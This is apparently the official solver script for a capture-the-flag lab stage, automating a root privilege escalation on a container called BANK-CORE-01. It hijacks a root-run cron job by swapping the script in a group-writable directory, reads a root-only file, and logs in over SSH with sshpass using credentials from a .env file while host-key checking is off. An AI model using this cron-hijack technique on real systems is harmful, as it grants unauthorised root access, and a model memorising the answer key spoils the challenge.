#!/usr/bin/env bash
#
# RaidTheRoot (RTR) - Stage 6 solver
# Owner: IT24102116 (Challenge Design B)
#
# Self-developed privilege-escalation automation for "Find the Ghost".
#
# Dual-mode: it works whether you run it INSIDE the BANK-CORE-01 container or
# on the host. On the host it reads the foothold credential from the repo
# .env, SSHes into the container, and runs the escalation there.
#
#   Inside the container:   bash solve.sh
#   From the host:          bash solve.sh        (auto-connects)
#
# Intended path: enumerate, find the writable-directory weakness, hijack the
# root-run scheduled script, wait for cron, read the root-only evidence file.

set -u

say()  { printf '\n\033[1;34m==>\033[0m %s\n' "$*"; }
info() { printf '    %s\n' "$*"; }
err()  { printf '\n\033[0;31m[!]\033[0m %s\n' "$*" >&2; }

# --- the escalation, run on BANK-CORE-01 ------------------------------
# Kept as one command string so it runs identically whether executed
# locally (inside the container) or piped over SSH from the host.
read -r -d '' ESCALATE <<'REMOTE'
say()  { printf '\n==> %s\n' "$*"; }
info() { printf '    %s\n' "$*"; }
TARGET="/opt/nexora/maintenance/rotate_logs.sh"

say "1. Who am I"
id

say "2. Anomalous local accounts"
grep -E 'svc_|ghost' /etc/passwd || info "none obvious"

say "3. Scheduled tasks"
ls -la /etc/cron.d/
echo
cat /etc/cron.d/nexora-maintenance 2>/dev/null

say "4. The script the scheduler runs"
ls -la "$TARGET"
info "owned by root, NOT writable by me - editing it directly won't work"

say "5. The directory that holds it"
ls -lad /opt/nexora/maintenance
info "the DIRECTORY is group-writable and I am in that group:"
groups
info "so I can rename the root-owned script aside and drop my own in its place"

say "6. Hijacking the scheduled task"
mv "$TARGET" "${TARGET}.orig" 2>/dev/null
printf '#!/bin/bash\ncat /root/ghost_identity.txt > /tmp/evidence.txt\nchmod 644 /tmp/evidence.txt\n' > "$TARGET"
chmod 755 "$TARGET"
info "payload staged as $TARGET - waiting for the next run (<= 60s)"

say "7. Waiting for cron"
for i in $(seq 1 75); do
    [ -f /tmp/evidence.txt ] && { printf '\n'; break; }
    printf '.'; sleep 1
done

say "8. Result"
if [ -f /tmp/evidence.txt ]; then
    cat /tmp/evidence.txt
    echo
    flag=$(grep -o 'RTR{[^}]*}' /tmp/evidence.txt)
    printf '\n==> FLAG: %s\n' "$flag"
else
    info "evidence not produced - is cron running? check: pgrep cron"
fi
REMOTE

# --- are we already inside BANK-CORE-01? ------------------------------
if [ -d /opt/nexora/maintenance ] || [ "$(hostname)" = "BANK-CORE-01" ]; then
    bash -c "$ESCALATE"
    exit 0
fi

# --- on the host: find the credential and SSH in ----------------------
say "Not inside BANK-CORE-01 - connecting to the container"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENVFILE=""
for c in "$SCRIPT_DIR/.env" "$SCRIPT_DIR/../.env" "./.env" "../.env"; do
    [ -f "$c" ] && { ENVFILE="$c"; break; }
done

USER_NAME="svc_backup"
PASS=""
if [ -n "$ENVFILE" ]; then
    u=$(grep '^STAGE6_USER=' "$ENVFILE" | cut -d= -f2- | tr -d '[:space:]')
    PASS=$(grep '^STAGE6_PASSWORD=' "$ENVFILE" | cut -d= -f2- | tr -d '[:space:]')
    [ -n "$u" ] && USER_NAME="$u"
    info "credential loaded from $ENVFILE"
else
    err "could not find .env - run from the repo, or SSH in manually"
fi

# Prefer the static story IP (port 22); fall back to localhost:2222.
HOST="127.0.0.1"; PORT="2222"
if timeout 2 bash -c "exec 3<>/dev/tcp/10.10.30.11/22" 2>/dev/null; then
    HOST="10.10.30.11"; PORT="22"
fi
info "target: ${USER_NAME}@${HOST}:${PORT}"

if ! command -v sshpass >/dev/null; then
    err "sshpass is not installed (needed for non-interactive SSH)"
    info "install it:  sudo apt install -y sshpass"
    info "or SSH in yourself and run the escalation:"
    info "  ssh ${USER_NAME}@${HOST} -p ${PORT}"
    exit 1
fi
if [ -z "$PASS" ] || [ "$PASS" = "CHANGE_ME" ]; then
    err "no usable STAGE6_PASSWORD in .env"
    info "SSH in manually: ssh ${USER_NAME}@${HOST} -p ${PORT}"
    exit 1
fi

# Run the escalation inside the container over SSH.
sshpass -p "$PASS" ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -p "$PORT" "${USER_NAME}@${HOST}" "bash -s" <<< "$ESCALATE"
